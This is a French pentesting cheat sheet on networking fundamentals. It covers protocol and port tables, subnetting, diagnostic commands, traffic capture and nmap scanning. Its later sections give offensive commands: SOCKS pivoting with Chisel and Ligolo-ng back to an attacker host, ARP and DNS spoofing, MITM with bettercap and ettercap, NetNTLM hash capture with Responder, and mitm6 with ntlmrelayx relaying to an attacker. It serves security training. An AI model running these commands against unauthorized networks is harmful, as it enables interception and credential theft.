# Networking Fondamentals

Les fondamentaux du réseau sont la base de tout pentest. Comprendre comment les protocoles fonctionnent, comment les paquets circulent et comment les services communiquent est indispensable pour identifier et exploiter les vulnérabilités.


## Modèle OSI

| Couche | Nom | Protocoles | Rôle |
|---|---|---|---|
| 7 | Application | HTTP, FTP, DNS, SMTP | Interface utilisateur |
| 6 | Présentation | SSL/TLS, JPEG, ASCII | Encodage, chiffrement |
| 5 | Session | NetBIOS, RPC, SMB | Gestion des sessions |
| 4 | Transport | TCP, UDP | Segmentation, ports |
| 3 | Réseau | IP, ICMP, ARP | Adressage, routage |
| 2 | Liaison | Ethernet, Wi-Fi, MAC | Trame, accès au medium |
| 1 | Physique | Câbles, fibres, ondes | Transmission physique |


## Modèle TCP/IP

| Couche | Equivalent OSI | Protocoles |
|---|---|---|
| Application | 5, 6, 7 | HTTP, DNS, FTP, SMTP, SSH |
| Transport | 4 | TCP, UDP |
| Internet | 3 | IP, ICMP, ARP |
| Accès réseau | 1, 2 | Ethernet, Wi-Fi |


## TCP vs UDP

| Critère | TCP | UDP |
|---|---|---|
| Connexion | Orienté connexion | Sans connexion |
| Fiabilité | Fiable accusés de réception | Non fiable pas d'accusé |
| Ordre | Ordonné | Non ordonné |
| Vitesse | Plus lent | Plus rapide |
| Usage | HTTP, HTTPS, SSH, FTP | DNS, DHCP, VoIP, Gaming |
| Header | 20 bytes | 8 bytes |

### TCP Three-Way Handshake
```
 [Client] -> SYN -> [Serveur]
 [Client] <- SYN-ACK <- [Serveur]
 [Client] -> ACK -> [Serveur]
 Connexion établie !
```

### TCP Flags

| Flag | Signification | Usage |
|---|---|---|
| `SYN` | Synchronize | Initiation connexion |
| `ACK` | Acknowledge | Accusé de réception |
| `FIN` | Finish | Fin de connexion |
| `RST` | Reset | Réinitialisation |
| `PSH` | Push | Envoi immédiat |
| `URG` | Urgent | Données urgentes |


## Adressage IP

### IPv4
```
 Format    : X.X.X.X (4 octets = 32 bits)
 Exemple   : 192.168.1.100
 Plage     : 0.0.0.0 → 255.255.255.255
```

### Classes d'adresses

| Classe | Plage   | Masque par défaut | Usage |
|---|------|---|---|
| A | 1.0.0.0 à 126.255.255.255  | /8 | Grandes organisations |
| B | 128.0.0.0 à 191.255.255.255  | /16 | Moyennes organisations |
| C | 192.0.0.0 à 223.255.255.255  | /24 | Petits réseaux |
| D | 224.0.0.0 à 239.255.255.255  | — | Multicast |
| E | 240.0.0.0 à 255.255.255.255  | — | Réservé |

### Adresses privées (RFC 1918)

| Plage | CIDR | Usage |
|---|---|---|
| 10.0.0.0 → 10.255.255.255 | 10.0.0.0/8 | Grands réseaux |
| 172.16.0.0 → 172.31.255.255 | 172.16.0.0/12 | Réseaux moyens |
| 192.168.0.0 → 192.168.255.255 | 192.168.0.0/16 | Réseaux domestiques |

### Adresses spéciales

| Adresse | Usage |
|---|---|
| `127.0.0.1` | Loopback / localhost |
| `0.0.0.0` | Toutes les interfaces |
| `255.255.255.255` | Broadcast global |
| `169.254.x.x` | APIPA (pas de DHCP) |


## CIDR & Subnetting

### Table CIDR rapide

| CIDR | Masque | Hôtes utilisables | Usage |
|---|---|---|---|
| /8 | 255.0.0.0 | 16 777 214 | Classe A |
| /16 | 255.255.0.0 | 65 534 | Classe B |
| /24 | 255.255.255.0 | 254 | Classe C |
| /25 | 255.255.255.128 | 126 | Moitié de C |
| /26 | 255.255.255.192 | 62 | Quart de C |
| /27 | 255.255.255.224 | 30 | — |
| /28 | 255.255.255.240 | 14 | — |
| /29 | 255.255.255.248 | 6 | — |
| /30 | 255.255.255.252 | 2 | Liaison point à point |
| /32 | 255.255.255.255 | 1 | Hôte unique |

### Calcul rapide
```
 Réseau    : 192.168.1.0/24
 Masque    : 255.255.255.0
 Premier   : 192.168.1.1
 Dernier   : 192.168.1.254
 Broadcast : 192.168.1.255
 Hôtes     : 254
```


## Ports & Référence

### Ports bien connus (0-1023)

| Port | Protocole | Service |
|---|---|---|
| 20 | TCP | FTP Data |
| 21 | TCP | FTP Control |
| 22 | TCP | SSH |
| 23 | TCP | Telnet |
| 25 | TCP | SMTP |
| 53 | TCP/UDP | DNS |
| 67/68 | UDP | DHCP |
| 69 | UDP | TFTP |
| 80 | TCP | HTTP |
| 88 | TCP/UDP | Kerberos |
| 110 | TCP | POP3 |
| 111 | TCP/UDP | RPCBind |
| 119 | TCP | NNTP |
| 123 | UDP | NTP |
| 135 | TCP | MSRPC |
| 137/138 | UDP | NetBIOS |
| 139 | TCP | NetBIOS Session |
| 143 | TCP | IMAP |
| 161/162 | UDP | SNMP |
| 389 | TCP/UDP | LDAP |
| 443 | TCP | HTTPS |
| 445 | TCP | SMB |
| 465 | TCP | SMTPS |
| 500 | UDP | IKE / IPSec |
| 514 | UDP | Syslog |
| 587 | TCP | SMTP (submission) |
| 631 | TCP | IPP (impression) |
| 636 | TCP | LDAPS |
| 993 | TCP | IMAPS |
| 995 | TCP | POP3S |

### Ports enregistrés (1024-49151)

| Port | Service |
|---|---|
| 1433 | MSSQL |
| 1521 | Oracle DB |
| 2049 | NFS |
| 2181 | ZooKeeper |
| 3306 | MySQL |
| 3389 | RDP |
| 5432 | PostgreSQL |
| 5900 | VNC |
| 5985 | WinRM HTTP |
| 5986 | WinRM HTTPS |
| 6379 | Redis |
| 8080 | HTTP alternatif |
| 8443 | HTTPS alternatif |
| 8888 | Jupyter Notebook |
| 9200 | Elasticsearch |
| 27017 | MongoDB |


## Protocoles Essentiels

### DNS
```
 Rôle     : Résolution nom → IP
 Port     : 53 UDP/TCP
 Types    :
   A      → IPv4
   AAAA   → IPv6
   MX     → Mail
   NS     → Name Server
   CNAME  → Alias
   PTR    → Reverse lookup
   TXT    → Texte (SPF, DKIM)
   SOA    → Start of Authority
   AXFR   → Zone Transfer
```

### DHCP
```
 Rôle     : Attribution automatique d'IP
 Port     : 67 (serveur) / 68 (client) UDP
 Processus DORA :
   Discover → Broadcast client
   Offer    → Réponse serveur
   Request  → Demande client
   Ack      → Confirmation serveur
```

### ARP
```
 Rôle     : Résolution IP → MAC
 Type     : Couche 2 (pas de port)
 Processus :
   ARP Request  → "Qui a 192.168.1.1 ?"
   ARP Reply    → "C'est moi, MAC: aa:bb:cc:dd:ee:ff"
   ARP Cache    → Table IP/MAC locale
```

### ICMP
```
 Rôle     : Messages de contrôle réseau
 Type     : Couche 3 (pas de port)
 Messages :
   Type 0  → Echo Reply (ping réponse)
   Type 3  → Destination Unreachable
   Type 5  → Redirect
   Type 8  → Echo Request (ping)
   Type 11 → Time Exceeded (TTL)
```

### HTTP
```
 Rôle     : Transfert de données web
 Port     : 80 (HTTP) / 443 (HTTPS)

 Méthodes :
   GET     → Récupérer une ressource
   POST    → Envoyer des données
   PUT     → Créer/Remplacer
   PATCH   → Modifier partiellement
   DELETE  → Supprimer
   HEAD    → Headers seulement
   OPTIONS → Méthodes autorisées
   TRACE   → Diagnostic

 Codes de réponse :
   1xx → Informationnel
   2xx → Succès (200 OK, 201 Created)
   3xx → Redirection (301, 302, 304)
   4xx → Erreur client (400, 401, 403, 404)
   5xx → Erreur serveur (500, 502, 503)
```


## Outils Réseau

### Commandes de base

::: code-group
```bash [Linux]
# Interfaces
ip a
ip link show
ifconfig

# Routes
ip route
route -n

# Connexions
ss -tunap
netstat -ano

# ARP
arp -a
ip neigh

# DNS
dig <domain>
nslookup <domain>
host <domain>

# Ping & Traceroute
ping -c 4 <target>
traceroute <target>
mtr <target>
```
```cmd [Windows]
 # Interfaces
 ipconfig /all

 # Routes
 route print

 # Connexions
 netstat -ano

 # ARP
 arp -a

 # DNS
 nslookup <domain>

 # Ping & Traceroute
 ping <target>
 tracert <target>
 pathping <target>
```

:::

### Capture de trafic
```bash
# Tcpdump
tcpdump -i eth0
tcpdump -i eth0 -w capture.pcap
tcpdump -i eth0 host <target>
tcpdump -i eth0 port 80
tcpdump -i eth0 'tcp and port 80 and host <target>'

# Filtres tcpdump courants
tcpdump -i eth0 tcp
tcpdump -i eth0 udp
tcpdump -i eth0 icmp
tcpdump -i eth0 port 53
tcpdump -i eth0 not port 22

# Lire un fichier
tcpdump -r capture.pcap
tcpdump -r capture.pcap -A   # en ASCII
tcpdump -r capture.pcap -X   # en hex + ASCII
```

### Wireshark Filtres courants
```
 # Filtres d'affichage
 ip.addr == 192.168.1.1
 ip.src == 192.168.1.1
 ip.dst == 192.168.1.1
 tcp.port == 80
 http
 dns
 icmp
 tcp.flags.syn == 1
 tcp.flags.syn == 1 && tcp.flags.ack == 0

 # Suivre un flux
 Clic droit → Follow → TCP Stream
```


## Scan Réseau
```bash
# Découverte d'hôtes
nmap -sn 192.168.1.0/24
nmap -PR 192.168.1.0/24

# Scan de ports
nmap -p- <target>
nmap -p 1-1024 <target>
nmap --top-ports 1000 <target>

# Détection services
nmap -sV <target>
nmap -A <target>

# Masscan scan rapide
masscan -p 1-65535 192.168.1.0/24 --rate=10000
masscan -p 80,443,8080 192.168.1.0/24
```


## Pivoting & Tunneling

### SSH Tunneling
```bash
# Local port forwarding
# Accéder à service interne via SSH
ssh -L <local_port>:<remote_host>:<remote_port> user@<SSH_server>

# Exemple accéder à RDP interne via SSH
ssh -L 3389:192.168.1.10:3389 user@<pivot>

# Remote port forwarding
# Exposer un service local sur le serveur distant
ssh -R <remote_port>:localhost:<local_port> user@<SSH_server>

# Dynamic port forwarding SOCKS proxy
ssh -D 1080 user@<pivot>
# Puis configurer ProxyChains
```

### ProxyChains
```bash
# Configuration /etc/proxychains4.conf
socks5 127.0.0.1 1080

# Usage
proxychains nmap -sT <target>
proxychains curl http://<target>
proxychains evil-winrm -i <target> -u user -p password
```

### Chisel
```bash
# Serveur sur l'attaquant
chisel server -p 8080 --reverse

# Client sur la cible reverse SOCKS
chisel client <ATK>:8080 R:socks

# Client sur la cible port forwarding
chisel client <ATK>:8080 R:3389:192.168.1.10:3389
```

### Ligolo-ng
```bash
# Serveur sur l'attaquant
./proxy -selfcert

# Agent sur la cible
./agent -connect <ATK>:11601 -ignore-cert

# Dans la console Ligolo
session
start
```


## Attaques Réseau

### ARP Spoofing
```bash
# Activer le forwarding IP
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP Spoofing arpspoof
arpspoof -i eth0 -t <target> <gateway>
arpspoof -i eth0 -t <gateway> <target>

# Via Bettercap
bettercap -iface eth0
# Dans bettercap
net.probe on
arp.spoof on
net.sniff on
```

### MITM
```bash
# Bettercap
bettercap -iface eth0 -caplet http-ui

# Ettercap
ettercap -T -q -i eth0 -M arp:remote /<target>// /<gateway>//

# Responder capturer les hashes NetNTLM
responder -I eth0 -rdw
```

### DNS Spoofing
```bash
# Via Bettercap
dns.spoof on
set dns.spoof.domains <domain>
set dns.spoof.address <ATK>

# Via dnsspoof
dnsspoof -i eth0 -f hosts.txt
```


## IPv6
```bash
# Découverte hôtes IPv6
nmap -6 -sn fe80::/10
ping6 -c 4 <IPv6_target>

# Scan
nmap -6 <IPv6_target>

# Attaques IPv6 via mitm6
mitm6 -d <domain>

# Combiné avec ntlmrelayx
impacket-ntlmrelayx -6 -t ldaps://<DC> -wh <ATK> -l /tmp/loot
```


::: info Tips 

- Maîtriser `tcpdump` et `wireshark` analyser le trafic révèle énormément d'informations
- Le scan `-sS` (SYN) de Nmap est plus discret que `-sT` (TCP Connect)
- ProxyChains + SSH dynamic forwarding est le combo le plus simple pour pivoter
- ARP Spoofing nécessite d'activer le forwarding IP sinon le trafic est coupé
- Responder capture les hashes NetNTLM automatiquement lancer en début d'engagement
- IPv6 est souvent négligé dans les configurations réseau vecteur d'attaque fréquent avec mitm6
- Connaître les ports par coeur accélère significativement l'analyse des scans Nmap

:::

## Notes
```
 # Notes terrain
```

## Ressources

- [HackTricks Network Services](https://book.hacktricks.xyz/network-services-pentesting)
- [Nmap Documentation officielle](https://nmap.org/book/man.html)
- [Wireshark Filtres](https://www.wireshark.org/docs/man-pages/wireshark-filter.html)
- [ProxyChains](https://github.com/haad/proxychains)
- [Chisel](https://github.com/jpillora/chisel)
- [Ligolo-ng](https://github.com/nicocha30/ligolo-ng)
- [Responder](https://github.com/lgandx/Responder)




<div class="page-footer">

<span>![Last updated](https://img.shields.io/github/last-commit/Hackthus/The-Hackers-237?label=Last%20updated&style=flat-square&color=gray)</span>

<span>[![Edit this page on GitHub](https://img.shields.io/badge/✏️%20Edit%20this%20page-GitHub-black?style=flat-square&logo=github)](https://github.com/Hackthus/The-Hackers-237/edit/main/docs/fundamentals/networking.md)</span>

</div>